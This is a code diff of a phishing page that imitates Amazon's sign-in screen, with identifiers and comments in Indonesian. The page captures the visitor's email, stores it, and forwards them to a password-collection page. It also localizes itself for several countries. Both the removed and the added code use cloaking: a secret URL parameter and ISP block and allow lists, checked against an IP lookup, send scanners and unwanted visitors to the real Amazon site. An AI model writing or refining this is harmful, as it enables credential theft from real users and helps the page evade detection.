@@ -4,134 +4,275 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon — Sign In</title>
+    <script type="module" src="config.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
-        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .logo { margin: 10px 0 25px; text-align: center; }
-        .logo span { font-size: 28px; font-weight: 700; color: #111; letter-spacing: -0.5px; }
-        .kotak { width: 100%; max-width: 340px; border: 1px solid #ddd; border-radius: 4px; padding: 20px 26px; }
-        h1 { font-size: 28px; font-weight: 500; margin-bottom: 10px; }
-        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; margin-top: 18px; }
-        input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 14px; height: 36px; }
-        input:focus { outline: none; border-color: #007185; box-shadow: 0 0 0 1px #007185; }
-        .tombol { width: 100%; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; padding: 8px 10px; font-size: 14px; color: #0F1111; cursor: pointer; margin-top: 22px; font-weight: 500; }
+        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
+        
+        /* === LOGO === */
+        .logo { margin: 10px 0 20px; text-align: center; }
+        .logo img { height: 31px; object-fit: contain; }
+        
+        /* === KOTAK MASUK === */
+        .kotak {
+            width: 100%; max-width: 348px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px 26px;
+        }
+        h1 { font-size: 28px; font-weight: 500; margin-bottom: 24px; }
+        
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 7px;
+            margin-top: 0;
+        }
+        input {
+            width: 100%;
+            padding: 7px 10px;
+            border: 1px solid #a6a6a6;
+            border-radius: 4px;
+            font-size: 15px;
+            height: 31px;
+            margin-bottom: 4px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0071e3;
+            box-shadow: 0 0 0 1px #0071e3;
+        }
+        .pesan-error {
+            color: #c40000;
+            font-size: 12px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        
+        .syarat {
+            font-size: 11px;
+            color: #555;
+            margin: 14px 0 22px;
+            line-height: 1.5;
+        }
+        .syarat a { color: #0066c0; text-decoration: none; }
+        .syarat a:hover { text-decoration: underline; }
+        
+        .tombol {
+            width: 100%;
+            background: #ffd814;
+            border: 1px solid #fcd200;
+            border-radius: 8px;
+            padding: 7px 10px;
+            font-size: 14px;
+            color: #0F1111;
+            cursor: pointer;
+            font-weight: 400;
+            height: 36px;
+        }
         .tombol:hover { background: #f7ca00; }
-        .pesan-error { color: #c40000; font-size: 12px; margin-top: 5px; display: none; }
-        .garis { height: 1px; background: #e7e7e7; margin: 30px 0 20px; }
-        .bawah { font-size: 12px; color: #555; text-align: center; margin-top: 30px; }
-        .bawah a { color: #0066c0; text-decoration: none; margin: 0 6px; }
+        
+        .bantuan {
+            margin-top: 22px;
+            font-size: 13px;
+        }
+        .bantuan a {
+            color: #0066c0;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+        .bantuan a:hover { text-decoration: underline; }
+        .panah {
+            font-size: 10px;
+            margin-right: 4px;
+            color: #555;
+        }
+        
+        .garis-pemisah {
+            display: flex;
+            align-items: center;
+            margin: 30px 0 15px;
+        }
+        .garis {
+            flex: 1;
+            height: 1px;
+            background: #e7e7e7;
+        }
+        .teks-garis {
+            padding: 0 10px;
+            font-size: 12px;
+            color: #767676;
+        }
+        
+        .tombol-buat {
+            width: 100%;
+            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
+            border: 1px solid #d5d9d9;
+            border-radius: 8px;
+            padding: 7px 10px;
+            font-size: 14px;
+            color: #0F1111;
+            cursor: pointer;
+            height: 36px;
+            margin-bottom: 30px;
+        }
+        .tombol-buat:hover { background: #e7e9ec; }
+        
+        .bawah {
+            font-size: 11px;
+            color: #555;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .bawah a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .bawah a:hover { text-decoration: underline; }
+        .copyright {
+            font-size: 11px;
+            color: #555;
+            text-align: center;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
-    <div class="logo"><span>amazon</span></div>
+    <div class="logo">
+        <img src="img/amazonlogo.png" alt="Amazon" onerror="this.style.display='none';">
+    </div>
+
     <div class="kotak">
-        <h1 id="judul">Sign In</h1>
+        <h1 id="judul">Sign in</h1>
+        
         <label id="lblEmail">Email or mobile phone number</label>
         <input type="text" id="email" autocomplete="username">
         <p class="pesan-error" id="errorEmail">Enter your email or mobile phone number</p>
+        
         <button type="button" id="lanjut" class="tombol">Continue</button>
+        
+        <p class="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
+        
+        <div class="bantuan">
+            <a href="#"><span class="panah">▶</span> Need help?</a>
+        </div>
     </div>
-    <div class="garis"></div>
+
+    <div class="garis-pemisah">
+        <div class="garis"></div>
+        <span class="teks-garis">New to Amazon?</span>
+        <div class="garis"></div>
+    </div>
+
+    <button class="tombol-buat" id="buatAkun">Create your Amazon account</button>
+
     <div class="bawah">
-        <a href="#">Conditions of Use</a> | <a href="#">Privacy Notice</a> | <a href="#">Help</a>
-        <p style="margin-top:5px;">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <a href="#">Conditions of Use</a>
+        <a href="#">Privacy Notice</a>
+        <a href="#">Help</a>
     </div>
+    <p class="copyright">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
 
-<script>
-// === CEK PARAMETER & ISP ===
-async function cekAkses() {
-  const paramTersimpan = localStorage.getItem('pengaturan_param');
-  const daftarBlokir = localStorage.getItem('daftar_blokir_isp') || '';
-  const daftarIzinkan = localStorage.getItem('daftar_izinkan_isp') || '';
-  
-  // Cek apakah ada parameter yang cocok
-  const params = new URLSearchParams(window.location.search);
-  let lolos = false;
-  for (const [kunci] of params.entries()) {
-    if (kunci === paramTersimpan && params.get(kunci) === 'aktif') {
-      lolos = true;
-      break;
+<script type="module">
+    import { deteksiBahasa, cekAkses, KUNCI_SIMPAN, TAUTAN } from './config.js';
+
+    const terjemahan = {
+        en: {
+            judul:'Sign in',
+            lblEmail:'Email or mobile phone number',
+            errorEmail:'Enter your email or mobile phone number',
+            btnLanjut:'Continue',
+            syarat:'By continuing, you agree to Amazon\'s <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.',
+            bantuan:'Need help?',
+            baru:'New to Amazon?',
+            btnBuat:'Create your Amazon account'
+        },
+        id: {
+            judul:'Masuk',
+            lblEmail:'Alamat email atau nomor ponsel',
+            errorEmail:'Masukkan alamat email atau nomor ponsel Anda',
+            btnLanjut:'Lanjutkan',
+            syarat:'Dengan melanjutkan, Anda menyetujui <a href="#">Syarat Penggunaan</a> dan <a href="#">Kebijakan Privasi</a>.',
+            bantuan:'Butuh bantuan?',
+            baru:'Baru di Amazon?',
+            btnBuat:'Buat akun Amazon Anda'
+        },
+        ja: {
+            judul:'ログイン',
+            lblEmail:'メールアドレスまたは携帯電話番号',
+            errorEmail:'メールアドレスまたは電話番号を入力してください',
+            btnLanjut:'続ける',
+            syarat:'続行することで、<a href="#">利用規約</a>および<a href="#">プライバシー規約</a>に同意したものとみなされます。',
+            bantuan:'ヘルプ',
+            baru:'Amazon をご利用になるのは初めてですか？',
+            btnBuat:'Amazonアカウントを作成'
+        },
+        zh: {
+            judul:'登录',
+            lblEmail:'电子邮箱或手机号码',
+            errorEmail:'请输入电子邮箱或手机号码',
+            btnLanjut:'继续',
+            syarat:'继续即表示您同意<a href="#">使用条款</a>和<a href="#">隐私声明</a>。',
+            bantuan:'需要帮助？',
+            baru:'初次使用亚马逊？',
+            btnBuat:'创建您的亚马逊账户'
+        },
+        th: {
+            judul:'เข้าสู่ระบบ',
+            lblEmail:'อีเมลหรือเบอร์โทรศัพท์',
+            errorEmail:'กรุณากรอกอีเมลหรือเบอร์โทรศัพท์',
+            btnLanjut:'ดำเนินการต่อ',
+            syarat:'ดำเนินการต่อ แสดงว่าคุณยอมรับ<a href="#">เงื่อนไขการใช้งาน</a>และ<a href="#">นโยบายความเป็นส่วนตัว</a>',
+            bantuan:'ต้องการความช่วยเหลือ?',
+            baru:'ยังไม่มีบัญชี Amazon?',
+            btnBuat:'สร้างบัญชี Amazon ของคุณ'
+        }
+    };
+
+    async function mulai() {
+        // Cek akses
+        const boleh = await cekAkses();
+        if (!boleh) return;
+
+        // Terapkan bahasa
+        const kodeBahasa = await deteksiBahasa();
+        const t = terjemahan[kodeBahasa] || terjemahan.en;
+        
+        document.getElementById('judul').textContent = t.judul;
+        document.getElementById('lblEmail').textContent = t.lblEmail;
+        document.getElementById('errorEmail').textContent = t.errorEmail;
+        document.getElementById('lanjut').textContent = t.btnLanjut;
+        document.querySelector('.syarat').innerHTML = t.syarat;
+        document.querySelector('.bantuan a').innerHTML = `<span class="panah">▶</span> ${t.bantuan}`;
+        document.querySelector('.teks-garis').textContent = t.baru;
+        document.getElementById('buatAkun').textContent = t.btnBuat;
     }
-  }
 
-  // Ambil info pengunjung
-  let info = { ip: '-', isp: '-', country_name: '-' };
-  try {
-    const res = await fetch('https://ipapi.co/json/');
-    info = await res.json();
-  } catch {}
+    // Tombol Continue
+    document.getElementById('lanjut').addEventListener('click', () => {
+        const email = document.getElementById('email').value.trim();
+        if (!email) {
+            document.getElementById('errorEmail').style.display = 'block';
+            return;
+        }
+        localStorage.setItem(KUNCI_SIMPAN.EMAIL, email);
+        window.location.href = TAUTAN.PASSWORD;
+    });
 
-  // Cek ISP
-  const isp = info.org || info.isp || '';
-  const blokirArr = daftarBlokir.split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
-  const izinkanArr = daftarIzinkan.split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
-  
-  const diblokir = blokirArr.some(nama => isp.toLowerCase().includes(nama));
-  const diizinkan = izinkanArr.length === 0 || izinkanArr.some(nama => isp.toLowerCase().includes(nama));
+    // Sembunyikan error saat mengetik
+    document.getElementById('email').addEventListener('input', () => {
+        document.getElementById('errorEmail').style.display = 'none';
+    });
 
-  if (!lolos || diblokir || !diizinkan) {
-    // Catat sebagai bot
-    if (window.tambahBot) {
-      window.tambahBot(info.ip || '-', isp, info.country_name || '-');
-    }
-    // Alihkan ke Amazon asli
-    window.location.href = 'https://www.amazon.com';
-    return false;
-  }
-  return true;
-}
+    // Tombol Create Account — tidak ke mana-mana
+    document.getElementById('buatAkun').addEventListener('click', (e) => {
+        e.preventDefault();
+    });
 
-document.addEventListener('DOMContentLoaded', async () => {
-  const boleh = await cekAkses();
-  if (!boleh) return;
-  // ... lanjutkan kode asli halaman
-});
-const terjemahan = {
-  en: { judul:'Sign In', lblEmail:'Email or mobile phone number', errorEmail:'Enter your email or mobile phone number', btn:'Continue' },
-  id: { judul:'Masuk', lblEmail:'Alamat email atau nomor ponsel', errorEmail:'Masukkan alamat email atau nomor ponsel Anda', btn:'Lanjutkan' },
-  ja: { judul:'ログイン', lblEmail:'メールアドレスまたは携帯電話番号', errorEmail:'メールアドレスまたは電話番号を入力してください', btn:'続ける' },
-  zh: { judul:'登录', lblEmail:'电子邮箱或手机号码', errorEmail:'请输入电子邮箱或手机号码', btn:'继续' },
-  th: { judul:'เข้าสู่ระบบ', lblEmail:'อีเมลหรือเบอร์โทรศัพท์', errorEmail:'กรุณากรอกอีเมลหรือเบอร์โทรศัพท์', btn:'ดำเนินการต่อ' }
-};
-
-async function deteksiBahasa() {
-  try {
-    const res = await fetch('https://ipapi.co/json/');
-    const d = await res.json();
-    const c = d.country_code || 'ID';
-    if (['JP'].includes(c)) return 'ja';
-    if (['CN'].includes(c)) return 'zh';
-    if (['TH'].includes(c)) return 'th';
-    if (['ID'].includes(c)) return 'id';
-  } catch {}
-  return navigator.language.startsWith('ja') ? 'ja' :
-         navigator.language.startsWith('zh') ? 'zh' :
-         navigator.language.startsWith('th') ? 'th' :
-         navigator.language.startsWith('id') ? 'id' : 'en';
-}
-
-async function terapkan() {
-  const b = await deteksiBahasa();
-  const t = terjemahan[b] || terjemahan.en;
-  document.getElementById('judul').textContent = t.judul;
-  document.getElementById('lblEmail').textContent = t.lblEmail;
-  document.getElementById('errorEmail').textContent = t.errorEmail;
-  document.getElementById('lanjut').textContent = t.btn;
-}
-terapkan();
-
-document.getElementById('lanjut').addEventListener('click', () => {
-  const email = document.getElementById('email').value.trim();
-  if (!email) {
-    document.getElementById('errorEmail').style.display = 'block';
-    return;
-  }
-  localStorage.setItem('email_pengguna', email);
-  window.location.href = 'password.html';
-});
-document.getElementById('email').addEventListener('input', () => {
-  document.getElementById('errorEmail').style.display = 'none';
-});
+    mulai();
 </script>
 </body>
 </html>
